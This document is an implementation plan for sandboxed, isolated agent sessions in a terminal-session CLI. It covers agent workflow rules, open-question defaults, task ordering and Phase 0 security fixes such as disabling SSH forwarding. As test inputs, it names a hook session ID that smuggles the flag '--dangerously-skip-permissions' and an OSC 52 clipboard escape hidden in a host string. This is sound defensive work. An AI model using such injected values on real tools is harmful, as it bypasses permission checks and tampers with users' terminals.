# Isolated sessions: implementation plan

**Status:** proposed, 10 November 2026. **Spec:** [isolation-spec.md](isolation-spec.md). **Decision:** [0029](decisions/0029-a-sandbox-per-session.md). **Research:** [isolation](../research/isolation.md). **Issue:** [#100](https://github.com/iamlakshya/simstim/issues/100).

This plan says in what order to build [the spec](isolation-spec.md), one pull request at a time. A coding agent builds each task under [AGENTS.md](../../AGENTS.md), [CONTRIBUTING.md](../../CONTRIBUTING.md) and [testing](testing.md). The spec says what each part does. This plan says which files each task changes, what proves it done, and which open questions it uses.

Task IDs are names, not positions. P0.1 to P7.5 come from the spec's sandbox sections, and H1 to H18 from its section 14, hosts you add. The order table gives the order. When this plan folds one task into another, the folds section says so, and both IDs stay valid.

Spec sections 1 to 13 cover the sandbox. Section 14 covers hosts you add, section 15 lists the open questions, and section 16 lists the risks. "Spec 14.10.5" means section 14.10.5 of the spec. "End-to-end test 2" means item 2 of the end-to-end tests in spec 14.16.

The words follow spec 2 and spec 14.1. A level is a wall's strength: `none`, `process`, `gvisor` or `microvm`. A tier is how far the user trusts a host: `own`, `throwaway` or `shared`. The floor is the weakest level that a host may give a new session. The release manifest is the list of digests that the client embeds.

## How to work

1. Build one task in each pull request, in the order of the table in "Order".
2. Name each branch `iso/<id>-<short-slug>`, with the ID in lower case. Examples: `iso/h2-forwarding-off` and `iso/p0.1-ghostty-pin`.
3. Start each branch from the branch of the task before it. Start the first branch from `main`.
4. Open each pull request against the branch of the task before it, so that its diff shows one task. CI runs on every pull request.
5. Never merge a pull request, and never push to `main`. The owner merges the pull requests in order.
6. Before each push, run `just test lint` and `just docs-check`. Fix every failure.
7. If CI fails for a reason outside the task, explain the failure in the pull request.
8. Ship the docs and the task's CHANGELOG line in the same commit as the code. Put the line under its section of `[Unreleased]`.
9. Run `just docs` after a change to a command, a flag, a config key or a key.
10. Make one logical change in each commit. Write a subject, a blank line and a body, and nothing more.
11. Add no trailer to a commit, and never run `git commit -s` ([0010](decisions/0010-no-commit-trailers.md)).
12. Spell the product name only in `internal/brand`, the docs and the module path. `just check-name` checks this.
13. Give every error a message and a "Try:" hint.
14. If a change touches the attach path, add a test that proves the bytes are unchanged.
15. If a task changes a project rule or a hard-to-undo choice, add a proposed decision record in its pull request. The folds section lists the records that this plan expects.
16. Give each new record the number that the folds section gives it. If another record has that number, take the next free number. Correct this plan's table in the same pull request.
17. If a pull request depends on a proposed record, say so in its description. The owner accepts the record before merging the pull request.
18. Use the recommended default of each open question that a task names. Name these questions in the pull request. Do not stop to ask the owner.
19. Where this plan folds two parts of the spec into one task, follow the task's text. It names the part that wins. Correct the spec in the same pull request.
20. Treat test hosts as other people's machines:
    - Run end-to-end tests only with `E2E_HOST` set to a host whose owner allowed them.
    - Log every change on a test host in a log outside the repository.
    - Never reboot a test host. Run a test of restore after a reboot only on a VM that the test creates and deletes. Otherwise, mark the test manual in the pull request.
    - Never attach to, type into, stop or delete a session that the task did not start.
    - Record the process IDs of the other sessions before and after a run. They show that the run left those sessions alone.
    - Never send a prompt to an agent on a test host. List a check that needs a prompt as a manual check in the pull request.
    - Run a memory stress test only under a cap of 512 MiB or less.
    - Run a root step on a test host only when its owner has set `E2E_ROOT=run`.
21. Effort uses the roadmap's scale. S is days, M is a week or two, and L is a month or more.

## Open questions and their defaults

Spec section 15 has each question in full, with its options: [open questions](isolation-spec.md#15-open-questions). A task that names a question uses its default. The last column lists the tasks that depend on each question.

| # | Question | Default | Tasks |
| --- | --- | --- | --- |
| 1 | When are walls on by default? | After phase 2, when bound secrets work. | P1.8, P2.10, P6.3 |
| 2 | On a small host, the strongest level or the densest level that meets the floor? | The strongest. A host may pin a lower level by name. | P1.1, H10, P3.8, P6.1 |
| 3 | Which microvm VMM? | Cloud Hypervisor v52.0 or later on host kernels 6.8 or later. Firecracker later for older kernels. No libkrun, no Kata. Firecracker 1.18 also drives Nitro Sandboxes on EC2. | P3.1, P3.3, P6.2, P6.4 |
| 4 | How do process walls get user namespaces on Ubuntu 23.10 or later? | An `AppArmor` profile for a root-owned copy of a small launcher. | H7, P1.5 |
| 5 | Where may the `process` level run? | On `own` and `throwaway` hosts, labelled "shares your account", never chosen by `new auto`, and with no `own`-tier secrets unless the user asks. | P1.1, P1.8, P2.10, H13 |
| 6 | Hosts that can run only `none`, such as Docker and E2B hosts, once walls are the default? | Refuse new sessions there without `--downgrade`. | P2.10 |
| 7 | A host kernel with a known unpatched local root bug? | Doctor warns, and the user decides. | P3.7 |
| 8 | The guest's root file system across starts? | Reset at each start, keeping `/work` and the agent's state. `system = "keep"` for those who want it. | P1.6, P3.4 |
| 9 | Idle stop for sandboxes? | Never in phase 1. Then 2 hours for microvm sandboxes, after the phase 3 measurements. | P1.11, P3.6, P3.8 |
| 10 | Keep the last screen across a stop? | No. | P1.11, P3.6 |
| 11 | Memory snapshots later? | Not in this plan. Look again only for sessions whose secrets are all bound. | P3.6, P5.1 |
| 12 | Encrypt a stopped session's disk with a key that the laptop sends at each start? | Not now. It would block a restore without the laptop. | P3.6 |
| 13 | Memory overcommit for sandboxes? | None. Admission counts declared memory. | H11 |
| 14 | The size of a sandbox when the user names none? | The template's size, with a size for each agent in the agent table as the template's default. | H11 |
| 15 | Which logins and keys work in a sandbox? | API keys and long-lived tokens as bound secrets, and exposed logins with a badge. An OAuth broker and a re-signing door are later research. | P1.8, P2.3 |
| 16 | TLS interception and body checks on model API hosts? | Yes, in its own decision record, accepted before the interception task merges. | P2.2, P2.4 |
| 17 | May sandboxed sessions push? | Only with a push grant, only to the session's own branches, and to a public repository only when the user names it. | P2.5 |
| 18 | What may a repository's own file do? | Narrow the policy, and propose grants that the user answers once for each file hash. | P2.9 |
| 19 | File drops and ports? | Images and PDF files only, and a grant for each port. | P1.9 |
| 20 | How much T1 control comes with the default flip? | Package manager settings only. Registry gates come later. | P2.8, P2.10, P7.1 |
| 21 | May agents update themselves in a sandbox? | No. Agents come read-only from the host's installs or the agents disk. | P1.6, P3.5 |
| 22 | Do machine-per-session hosts get real secret values? | Only as exposed secrets, recorded as such. | P7.4 |
| 23 | Do Unix sockets and VM sockets count as listening? | No, only network ports count (decision 0030). | P0.2, P1.4, P1.7, P1.9, P3.3 |
| 24 | Is a sandbox's egress process a relay? | No (decision 0031). | P1.7 |
| 25 | May bound secret values and a per-session TLS key live in the trusted side's memory for the whole session? | Yes, never in a file (decision 0032). | P2.2, P2.3 |
| 26 | An opt-in guarded attach, or a filter for terminal escapes from `shared` and `throwaway` hosts? | Not now. Advise users to set their terminal's clipboard writes to "ask", ship the observer, measure, then decide. | H4, P7.3 |
| 27 | Separate accounts for sandboxes, with a root-owned launcher and slot accounts? | An option in the first version. The default only after an outside review of the launcher. | H17, H18 |
| 28 | A separate system user for the trusted side? | Not now. Subuid jails for the processes that touch untrusted input. | P1.3 |
| 29 | May host set-up run one-time root steps? | Yes, each line shown first and run only after a yes. On `shared` hosts, by default only the machine's owner runs the printed script, and `--root-step run` needs the typed host name. | H7, H10, H15 |
| 30 | Which key signs what the client trusts? | The release key of decision 0017 signs each release, and the client embeds the release manifest. The owner adds a hardware key for the signed-tag gate. A transparency log comes later. | P4.1, P4.4, H17 |
| 31 | A key of its own for each shared host? | A docs recipe, not required. | H4 |
| 32 | The tier of E2B and other hosted providers? | `shared`. | H4, P7.4 |
| 33 | Where tiers live, and what `--yes` means? | In `tiers.toml`, which older clients never write. `host add --yes` without `--tier` fails, and names the flag ([question 50](isolation-spec.md#15-open-questions)). | H4, H5 |
| 34 | The word for how far the user trusts a host? | "tier" (`own`, `throwaway`, `shared`), because "level" names a wall's strength and "trust" names setup-script trust. | H4 |
| 35 | Copies from one host to another? | Never. Runtime files come from the release or the laptop, templates from the laptop, and registry images by a digest that the laptop pins. A saved image stays on the host that made it. | H9, P3.2, P4.5, P5.5 |
| 36 | Hosts behind NAT? | Docs for the user's own overlay network, plus a hardened reverse-tunnel recipe on a machine the user owns. | H16 |
| 37 | Mac hosts? | Later, after a test of Apple's Virtualization framework from an SSH session. Until then a Mac runs sandboxes in a Lima VM. | P0.8, P3.7 |
| 38 | How are signatures checked? | In Go on both sides, so the client's OpenSSH minimum version stays 8.0. | P4.1, H17 |
| 39 | May a host download the runtime itself? | `auto`: the host fetches from the release when it can, and the laptop copies it otherwise. `fetch = "laptop"` keeps the old rule. | H9, P3.2, H10 |
| 40 | Ship the forwarding fix first? | Yes, task H2 on its own, first. | H2 |
| 41 | Team hosts and timed loans? | Wait for demand. A teammate's machine is a `shared` host meanwhile. | H4 |
| 42 | How fast does the project answer an advisory for the VMM, the kernel or Ghostty? | A release within 7 days for a high severity, with the known-bad list in that release. | P0.9, P4.6, H14 |
| 43 | What does the built-in layer do with a site that no rule covers? | `ask`. The guided setup asks once and offers all four actions. | P2.11 |
| 44 | Can a narrower layer allow what a broader layer denies? | Yes. The narrowest matching layer decides, and `[lock]` holds what must never change. | P1.12 |
| 45 | Does the classifier ship with a judge turned on? | No. `judge = "none"` is built in. A model or a program is the user's choice. | P2.11, P2.12 |
| 46 | How wide is a judge's allow? | The session. Profiles may set `once`. | P2.12 |
| 47 | Do the sessions of one sandbox share its policy? | Yes. | P1.13 |
| 48 | Where does `shell` run? | Inside the sandbox. | P1.13 |
| 49 | Can a sandbox get the laptop's own SSH agent? | No. Named keys only, from the sandbox's own agent. | P2.13 |
| 50 | What does `host add --yes` do without `--tier`? | It fails, and names the flag. | H4 |
| 51 | What does a walled session do with a folder outside git? | It gets an empty workspace, and the row says "scratch". | P1.6 |
| 52 | Does the judge see the task line of `new --task`? | Yes. | P2.12 |
| 53 | Should EC2 hosts use Nitro Sandboxes? | Yes: a `nitro` driver at the `microvm` level, on Firecracker 1.18.0 or later, in phase 6. It wins over nested KVM. | P6.4 |
| 54 | Direct mode or confidential mode? | Direct. Confidential mode with attestation later, under its own record. | P6.4 |
| 55 | A desktop and computer use? | No built-in stream. An image with a virtual display, a computer-use MCP server and `forward` works. | none |
| 56 | Public URLs for a sandbox's ports? | No. `forward`, and a docs recipe for the user's own tunnel. | none |
| 57 | Devices inside a sandbox: `/dev/kvm`, a GPU or FUSE? | None, except FUSE in a microvm guest with `sudo` or `--docker`. | P3.4 |
| 58 | A laptop or host port inside a sandbox? | An explicit reverse forward of one laptop port, on `own` hosts. | P1.9 |
| 59 | An SDK, a REST API, webhooks or OpenTelemetry? | The CLI with `--json`, exit codes and `events`, and alerts with an `otlp` format. | P1.16 |
| 60 | Root inside a sandbox? | Off. `sandbox.sudo` on a microvm only. | P3.4 |
| 61 | Share package caches between sandboxes? | No. Each sandbox keeps its own, and images give warm starts. | P1.15 |
| 62 | How do editors reach a sandbox? | SSH that ends in the client. | P2.15 |
| 63 | Does a seed from the laptop include uncommitted work? | Only with `--seed-dirty`. | P1.14 |
| 64 | A host-side MCP gateway or a shared skills store? | No. MCP servers run in the sandbox, and skills arrive by `copy_in`. | none |
| 65 | How does a host get a private registry image? | The laptop pulls it with its own login and copies it. | P3.2 |

## Order

Build the tasks from top to bottom. Every task named under "Depends on" is above the task that needs it, or is a task of [the CLI plan](cli-plan.md), such as C2 and C4. A four-digit number there is a decision record that the owner accepts before the pull request merges. "(here)" marks a record that the task itself adds.

| # | ID | Title | Phase | Depends on | Questions | Effort |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | H2 | Turn off forwarding on every connection | 0 | 0034 (here) | 40 | S |
| 2 | P0.1 | Bump the shadow terminal's Ghostty pin, and cap terminal sizes | 0 | none | none | S |
| 3 | P0.2 | A hook socket of its own, and a peer check on the holder's socket | 0 | 0030 | 23 | M |
| 4 | P0.3 | Check an agent's session ID before it enters a command | 0 | none | none | S |
| 5 | P0.4 | Clean every string that a host sends before the client draws it | 0 | none | none | S |
| 6 | P0.5 | A paste guard | 0 | none | none | S |
| 7 | P0.6 | Tie setup trust to the script's content | 0 | none | none | S |
| 8 | P0.7 | Safe copies and safer git on the trusted side | 0 | none | none | S |
| 9 | P0.8 | Lima VMs that cannot reach the laptop's loopback | 0 | none | 37 | S |
| 10 | P0.9 | Watch pins that no package ecosystem covers | 0 | none | 42 | S |
| 11 | H3 | Pinned host keys and `host rekey` | 0 | H2, 0035 (here) | none | M |
| 12 | H4 | The host ID and the tiers file | 0 | H3, 0036 (here) | 26, 31, 32, 33, 34, 41, 50 | M |
| 13 | H5 | The grant gate and the grant ledger | 0 | H4, 0036 | 33 | M |
| 14 | P1.1 | Wall levels, the sandbox probe and the floor | 1 | H5 | 2, 5 | M |
| 15 | H7 | The root step | 1 | P1.1, H4, 0037 (here) | 4, 29 | M |
| 16 | P1.2 | The link | 1 | none | none | M |
| 17 | P1.3 | Jails | 1 | none | 28 | M |
| 18 | P1.4 | The supervisor, the guest init and the holder's guest mode | 1 | P1.2, P0.2, 0029, 0030 | 23 | L |
| 19 | P1.5 | The process wall | 1 | P1.3, P1.4, H7 | 4 | L |
| 20 | P1.6 | The files door | 1 | P1.5 | 8, 21, 51 | M |
| 21 | P1.7 | The egress process, first version | 1 | P1.4, 0030, 0031 | 23, 24 | L |
| 22 | P1.8 | The client and the launcher | 1 | P1.1, P1.5, P1.7, H5, 0033, C2, C4 | 1, 5, 15 | M |
| 23 | P1.12 | Layers, profiles and locks | 1 | P1.7, P1.8, 0033 | 44 | M |
| 24 | P1.13 | Shells and commands in a sandbox | 1 | P1.4, P1.5, P1.8 | 47, 48 | M |
| 25 | P1.14 | Sizes, variables, files and seeds from the laptop | 1 | P1.6, P1.12, P1.13 | 14, 63 | M |
| 26 | P1.15 | Kept caches | 1 | P1.6 | 61 | S |
| 27 | P1.9 | Paste and ports through the supervisor | 1 | P1.4, P1.5, 0030 | 19, 23, 58 | M |
| 28 | P1.10 | Pull through a bundle, with a review | 1 | P1.6 | none | M |
| 29 | P1.11 | Destroy, stop, restore and the phase's checks | 1 | P1.8, P1.10, P1.13 | 9, 10 | M |
| 30 | P1.16 | Runs for many sessions | 1 | P1.8, P1.11 | none | M |
| 31 | P2.1 | DNS policy | 2 | P1.7 | none | M |
| 32 | P2.2 | Interception, and method and path rules | 2 | P2.1, 0032, 0038 (here) | 16, 25 | L |
| 33 | P2.3 | Bound secrets | 2 | P2.2, 0032 | 15, 25 | L |
| 34 | P2.4 | The model API guard | 2 | P2.2 | 16 | M |
| 35 | P2.5 | Service rules | 2 | P2.3 | 17 | M |
| 36 | P2.6 | Holds and approvals | 2 | P1.8, P2.2 | none | M |
| 37 | P2.11 | The unknown action and the classifier's fixed steps | 2 | P2.1, P2.6 | 43, 45 | M |
| 38 | P2.12 | The judge | 2 | P2.11, P2.3, 0031 | 45, 46, 52 | M |
| 39 | P2.13 | SSH keys | 2 | P2.3, H5, 0032 | 49 | M |
| 40 | P2.14 | Change policy while sessions run | 2 | P1.12, P2.6 | none | M |
| 41 | P2.15 | Editors over SSH | 2 | P1.13, P1.9 | 62 | M |
| 42 | P2.16 | Model usage and budgets | 2 | P2.4, P2.14 | none | S |
| 43 | P2.17 | More agent rows | 2 | none | none | S |
| 44 | P2.7 | Budgets and stricter targets | 2 | P2.2 | none | S |
| 45 | P2.8 | Package managers in the guest | 2 | P1.5 | 20 | S |
| 46 | P2.9 | A repository's own file | 2 | P1.8 | 18 | M |
| 47 | P2.10 | Walls by default | 2 | P2.3, P2.6, P2.8, H4, H5, 0029 | 1, 5, 6, 20 | S |
| 48 | P4.1 | The release manifest and the check before the bridge | 3 | none | 30, 38 | M |
| 49 | P3.1 | The boot pair | 3 | P1.4, P4.1 | 3 | L |
| 50 | H9 | Runtime delivery and the host cache | 3 | P4.1, P1.1, P3.1, 0039 (here) | 35, 39 | M |
| 51 | P3.2 | Images | 3 | P1.3, H9 | 35, 39, 65 | L |
| 52 | P3.3 | The Cloud Hypervisor driver | 3 | P3.1, P3.2, P1.3, H9, 0030, 0040 (here) | 3, 23 | L |
| 53 | P3.4 | The guest init on a microvm | 3 | P3.3 | 8, 60, 57 | M |
| 54 | P3.5 | The agents disk | 3 | P3.2 | 21 | M |
| 55 | P3.6 | Lifecycle on a microvm | 3 | P3.4 | 9, 10, 11, 12 | M |
| 56 | P3.7 | The microvm probe, the kernel list and Lima | 3 | P3.3, H7, P0.8 | 7, 37 | S |
| 57 | H10 | Prepare in `host add` | 3 | H7, H9, P3.4, P1.8 | 2, 29, 39 | M |
| 58 | P3.8 | Conformance, measurements and release | 3 | P3.1 to P3.7, H10 | 2, 9 | M |
| 59 | P4.2 | Run verified bytes only | 4 | P4.1, P3.3, H9 | none | M |
| 60 | P4.3 | Reproducible kernel and tools image | 4 | P3.1 | none | M |
| 61 | P4.4 | A signed-tag release gate | 4 | 0041 (here) | 30 | S |
| 62 | P4.5 | Image policy | 4 | P3.2 | 35 | M |
| 63 | P4.6 | Known-bad versions | 4 | P4.1, P0.9 | 42 | S |
| 64 | H11 | Facts and admission | 4 | P1.1, P1.5, H9, 0042 (here) | 13, 14 | M |
| 65 | H12 | Named placement | 4 | H11, H4, H5 | none | S |
| 66 | H13 | `new auto` | 4 | H12, H5, P3.8 | 5 | M |
| 67 | H14 | Health, runtime upgrades and drain | 4 | H11, H9, P4.6 | 42 | M |
| 68 | H15 | Leave and wipe | 4 | H7, H5, H9 | 29 | M |
| 69 | H16 | Reach a host behind NAT | 4 | H3, H9, 0031 | 36 | S |
| 70 | P5.1 | Fork | 5 | P3.6 | 11 | M |
| 71 | P5.2 | Copy files in and out | 5 | P1.9 | none | M |
| 72 | P5.4 | Checkpoints | 5 | P3.6 | none | M |
| 73 | P5.5 | Save an image | 5 | P3.2 | none | M |
| 74 | P6.1 | The gvisor wall | 6 | P1.5, H9 | 2 | L |
| 75 | P6.2 | The Firecracker driver | 6 | P3.8 | 3 | M |
| 76 | P6.4 | Nitro Sandboxes on EC2 | 6 | P6.2, P3.1, H7, H9 | 53, 54 | M |
| 77 | P6.3 | Unwalled sessions on the supervisor's path | 6 | P1.11, P2.10, and one release with walls on by default | 1 | M |
| 78 | P7.1 | Registry gates in the egress process | 7 | P2.2 | 20 | M |
| 79 | P7.2 | Decoys | 7 | P2.3 | none | S |
| 80 | P7.3 | Observe terminal output | 7 | P4.6 | 26 | M |
| 81 | P7.4 | A machine for each session | 7 | P1.11, H4, H5 | 22, 32 | L |
| 82 | H17 | Separate accounts, part 1: the root-owned launcher | 8 | H7, H9, P4.1, 0043 (here) | 27, 30, 38 | L |
| 83 | H18 | Separate accounts, part 2: slot accounts and the root-owned store | 8 | H17, P3.3 | 27 | L |

## Folds

This plan folds five tasks whole into others, and seven parts of tasks in part. A fold keeps the acceptance criteria and the tests of both tasks. Only three parts go: H8's separate runtime key, its minimum version and its expiry. The release manifest makes them needless.

### Whole folds

| Task | Into | Why |
| --- | --- | --- |
| H1 Decision records for sandbox hosts | The first task that needs each record: H2, H3, H4, H7, H9 and H11 | Each record lands beside the code it decides. The next section gives the reasons. |
| H6 The sandbox probe | P1.1 | Both add one read-only bridge request that reports what a host can run. P1.1 keeps the levels, the floor, `host show` and `host set … floor=`. H6 adds the host's facts, the "Sandboxes" block of `host doctor` and the name `sandbox.probe`. |
| H8 The signed runtime manifest | P4.1 | Both make one list of trusted files for each release. The client embeds the digests, so a host cannot roll back, and no separate key, minimum version or expiry is needed ([question 30](isolation-spec.md#15-open-questions)). |
| P5.3 Run a command | P1.13 | Both start a process in a running sandbox through the supervisor. `exec` is the same path as `shell` without a terminal, and daily work needs both from phase 1. |
| P7.5 Placement across hosts | H11, H12 and H13 | H11 to H13 build the same placement in more detail: facts, admission under a lock, a default host, then `new auto`. P7.5's `node.info` request is `host.facts`, and its `full` answer is `no_room`. |

### Why H1 is not a task of its own

H1's records land in the pull requests of the first tasks that need them, for these reasons:

- The owner reads each record beside the code that it decides, in one review.
- No record waits months for its code. No record describes a design that a later task may change before the record lands.
- Each open question already has a default, so no early task must collect answers before the code starts.
- The stacked branches already give one record and one change in each pull request, as rule 6 of AGENTS.md asks.

No task is then a records-only task. Each record's pull request carries the CHANGELOG line of its code.

### Partial folds

| Part | From | Into | Why |
| --- | --- | --- | --- |
| P3.7's set-up command, with the `io_uring`, vsock module and subuid steps | P3.7 | H7 | One root step serves every level, through one command, `host prepare --root-step`. The client runs sudo in the user's terminal, so the helper has no bridge op that runs sudo. |
| The `AppArmor` step for user namespaces | P3.7 | P1.5 | The process wall needs it on Ubuntu 23.10 or later, long before phase 3 ([question 4](isolation-spec.md#15-open-questions)). |
| The level and the floor in the launcher's host rows | H10 | P1.8 | P1.8 already changes the host rows. H10 keeps the prepare flow of `host add`. |
| The host's store of runtime files | H9 and P4.2 | One artefact store | H9 creates `DataDir()/artefacts/sha256/` (spec 10.7 and 14.5). P4.2 seals its files and runs them from a checked descriptor. |
| The list of advisories | H8 and P4.6 | P4.6, which H14 reads | One known-bad list lives in the release manifest. H14's `advisory` item and the `exposed` mark of `ls` read it. |
| The runtime checks of admission | H11 | One check, `runtime_missing` | No check of a minimum version or an expiry remains. Admission refuses a start whose runtime digests are not in the store. |
| Health items for a minimum version and an expiry | H14 | One item, `runtime-missing` | The same reason as the row above. |

### Looked at and kept apart

- **P7.4 and the provider tier** ([question 32](isolation-spec.md#15-open-questions)). P7.4 stays a task of its own. H4 already gives each provider host its tier, and P7.4 uses it. An E2B machine is `shared`, and its secrets go only as exposed secrets ([question 22](isolation-spec.md#15-open-questions)).
- **P1.1 and H10.** P1.1 pins the floor at `host add`. H10 adds the rest of the prepare flow. They change different steps of `host add`.
- **User templates** (spec 14.9.5) have no task in this plan. They come later, under the rules of 14.9.5. H5's grant table keeps their row for that work.
- **H5 and the `policy allow` command of P1.8.** The grant gate caps the door grants of P1.8 by tier. P1.8 calls `Allow` and adds no gate of its own.

### Decision records

Five records already exist in this branch, as proposed records: 0029 to 0032 for this plan, and 0033, the command grammar of [the CLI plan](cli-plan.md). Every command that this plan adds follows 0033. This plan adds ten more records, each in the pull request of the task that first needs it.

| Record | Status | Decides | Needed by | Questions |
| --- | --- | --- | --- | --- |
| [0029](decisions/0029-a-sandbox-per-session.md) | Proposed, in this branch | Each session runs in its own sandbox, behind a wall with a floor, and every door stays closed until the user grants it | P1.4, which may not merge before the owner accepts it. P2.10 also needs it, for walls by default. | 1 |
| [0030](decisions/0030-local-sockets-do-not-listen.md) | Proposed, in this branch | Unix sockets and VM sockets do not count as listening on a host | P0.2, P1.4, P1.7, P1.9, P3.3 | 23 |
| [0031](decisions/0031-the-egress-process-is-not-a-relay.md) | Proposed, in this branch | A sandbox's egress process on the user's own host is not a relay | P1.7, H16 | 24 |
| [0032](decisions/0032-secret-values-in-memory-only.md) | Proposed, in this branch | Secret values live only in the memory of the trusted side | P2.2, P2.3 | 25 |
| [0033](decisions/0033-one-command-grammar.md) | Proposed, in this branch | One grammar for the command line: session verbs at the top, a noun and a verb for everything else, and every rule under `policy` | P1.8, P1.12 and every task that adds a command | none |
| `0034-ssh-options-on-the-command-line.md` | New, in H2 | The client puts the options that keep a host safe on the `ssh` command line, where they win over the user's own config. It starts with forwarding. | H2 | 40 |
| `0035-pinned-host-keys.md` | New, in H3 | Saved hosts pin their host key on the command line, under the rule of 0034 | H3 | none |
| `0036-host-tiers-and-the-grant-gate.md` | New, in H4 | Host tiers in `tiers.toml`, one grant gate on the laptop, `shared` for E2B, and the SSH agent only for `own` hosts | H4, then H5 | 32, 33, 34 |
| `0037-the-root-step.md` | New, in H7 | The root step: the sandbox probe as its input, one optional script, and sudo in the user's terminal. It bends "setup needs no root". | H7 | 4, 29 |
| `0038-tls-interception-on-the-trusted-side.md` | New, in P2.2 | The egress process decrypts TLS for bound hosts, model APIs, registries and object stores. It needs every maintainer's yes. | P2.2 | 16, 25 |
| `0039-runtime-delivery.md` | New, in H9 | Runtime delivery, and downloads by the host. It extends [0017](decisions/0017-release-signatures.md). | H9 | 35, 39 |
| `0040-memory-of-microvm-guests.md` | New, in P3.3 | A microvm guest gets the session's cap minus 160 MiB. It extends [0024](decisions/0024-memory-cap.md). | P3.3 | 3 |
| `0041-a-signed-tag-release-gate.md` | New, in P4.4 | A release builds only from a tag signed with a hardware key. It extends [0017](decisions/0017-release-signatures.md). | P4.4 | 30 |
| `0042-admission-refuses-what-does-not-fit.md` | New, in H11 | A sandbox that does not fit is refused, not made smaller. It amends [0024](decisions/0024-memory-cap.md) for sandboxes only. | H11 | 13, 14 |
| `0043-separate-accounts-for-sandboxes.md` | New, in H17 | A root-owned launcher, one sudo line that allows no arguments, and slot accounts | H17, then H18 | 27, 30, 38 |

## Phase 0: close today's holes

These tasks need no wall, and they help every session. H2 goes first ([question 40](isolation-spec.md#15-open-questions)). H3 to H5 give each host an identity and a tier before any sandbox exists.

### H2 Turn off forwarding on every connection

- **Goal:** close today's gap. A `ForwardAgent yes` in the user's SSH config no longer reaches any host. The client puts its own options on the `ssh` command line, where they win over every config file.
- **Files:** `internal/client/ssh.go` (`baseArgs`, `Command`), `internal/client/transport.go` (`SSH.Start`), new `test/e2e/sandbox_hosts.py` (run with `E2E_ONLY=sandbox-hosts`), `test/e2e/run.py`, new `docs/contributing/decisions/0034-ssh-options-on-the-command-line.md`, `docs/contributing/decisions/README.md`.
- **Acceptance:**
  - Every `ssh` command has `-o ForwardAgent=no -o ForwardX11=no -o PermitLocalCommand=no`.
  - The bridge and `Run` also have `-o ClearAllForwardings=yes`.
  - `forward` still forwards its ports. `SSH.Forward` keeps its own `-L` options and has no `ClearAllForwardings`.
- **Tests:** unit tests of the arguments in `internal/client` and in `internal/cli/commands_ssh_test.go`. End-to-end test 2: with `ForwardAgent yes` in a throwaway client SSH config, a session on the host has no `SSH_AUTH_SOCK`.
- **Docs:** `docs/explanation/security.md` (agent forwarding). Section 7.5 of `docs/research/connectivity-and-providers.md` now holds, and it says so. The record 0034.
- **CHANGELOG:** Security. "The client no longer forwards your SSH agent, X11 or a local command to any host, even when your `~/.ssh/config` asks for it. `forward` still forwards the ports you name."
- **Depends on:** nothing. It adds the record 0034.
- **Questions:** [40](isolation-spec.md#15-open-questions).
- **Effort:** S.

### P0.1 Bump the shadow terminal's Ghostty pin, and cap terminal sizes

- **Goal:** the pin moves past `e257bb45` ([GHSA-w9q4-5jvv-mcv4](https://github.com/ghostty-org/ghostty/security/advisories/GHSA-w9q4-5jvv-mcv4)) and `0af5c9e55` (GHSA-jqr7-69mm-v35h). The host caps a terminal size from a client at 4096 columns and rows, not 65535.
- **Files:** `vt/build.zig.zon`, `vt/README.md`, `internal/host/holder_conn.go` (the resize), `internal/host/vt.go` and `internal/host/vt_child.go` (a new `clampTerm` in place of `clamp16` for sizes).
- **Acceptance:** `just vt` builds. The replay fixtures pass. A resize to 65535 columns sets 4096.
- **Tests:** unit tests of `clampTerm`. The existing vt tests, and the fidelity fixtures in `test/ttyshot`.
- **Docs:** `vt/README.md` (the pin, and why).
- **CHANGELOG:** Fixed. "The shadow terminal now uses a Ghostty commit with the fixes for two advisories in which terminal output could corrupt its memory. The host caps a terminal size from a client at 4096 columns and rows."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** S.

### P0.2 A hook socket of its own, and a peer check on the holder's socket

- **Goal:** an agent's hooks reach only their own session, and only with hook events. No process inside a session's unit can attach to, type into or stop any session.
- **Files:**
  - `internal/paths/paths.go` (`HookSocket`).
  - `internal/host/holder.go` (a second listener).
  - `internal/host/holder_conn.go` (the role and peer check in `Holder.serve`).
  - `internal/host/hooks.go`: `RunHook` reads `<NAME>_HOOK_SOCK`, then `<NAME>_SOCK` for old sessions.
  - `internal/host/ops.go`: `sessionEnv` sets `<NAME>_HOOK_SOCK`, and no longer `<NAME>_SOCK`.
  - New `internal/host/peer_linux.go` and `internal/host/peer_other.go`.
- **Acceptance:**
  - A process in session A's unit that dials session B's socket gets `forbidden` for `attach`, `send`, `kill` and `peek`.
  - A hook still updates its own session's state.
  - On a host without systemd, the holder falls back to the role check, and `host doctor` says that the check is weaker there.
- **Tests:** unit tests with a fake `/proc`, in the `procRoot` pattern. End to end: the test starts two sessions of its own. A shell in the first sends the helper's request to the second, and the request fails.
- **Docs:** `docs/explanation/security.md`.
- **CHANGELOG:** Security. "A program in one session can no longer type into, attach to or stop another session through its socket. Agents' hooks use a socket that accepts only hook events."
- **Depends on:** [0030](decisions/0030-local-sockets-do-not-listen.md): the hook socket is a Unix socket, which does not listen on the host.
- **Questions:** [23](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P0.3 Check an agent's session ID before it enters a command

- **Goal:** a hook cannot make a resume run with extra flags.
- **Files:**
  - `internal/agents/agents.go` (new fields `IDPattern` and `DangerFlags`).
  - `internal/host/hooks.go` (`applyHook` checks the pattern).
  - `internal/host/restore.go`: `resumeArgv` refuses an argv with a danger flag that the user did not type. It puts `--` before a positional ID where the agent accepts it.
- **Acceptance:** a `session-start` hook whose `session_id` is `--dangerously-skip-permissions` changes nothing, and the holder's log says why.
- **Tests:** table tests for each first-class agent. A fuzz test of `applyHook`.
- **Docs:** `docs/reference/agents.md`, through `just docs`.
- **CHANGELOG:** Security. "The host keeps an agent's session ID from a hook only when it has the agent's form, such as a UUID for Claude Code. A hook can no longer add flags to the agent's resume command."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** S.

### P0.4 Clean every string that a host sends before the client draws it

- **Goal:** no control, bidirectional, zero-width or tag character from a host reaches the launcher, `ls` or a notice.
- **Files:** new `internal/api/text.go` (`CleanText`), `internal/client/attach_notify.go` (`oscSafe` uses it), `internal/tui/detail.go` and the other places that draw `Reason`, `Name` and `Cwd`, `internal/cli/session.go` (`ls`), `internal/alerts/event.go` (`<NAME>_DETAIL_FROM`).
- **Acceptance:** a reason of `"\x1b]52;c;…\x07"` draws as plain text. The golden tests do not change for clean input.
- **Tests:** unit and fuzz tests of `CleanText`. A launcher test with a hostile reason.
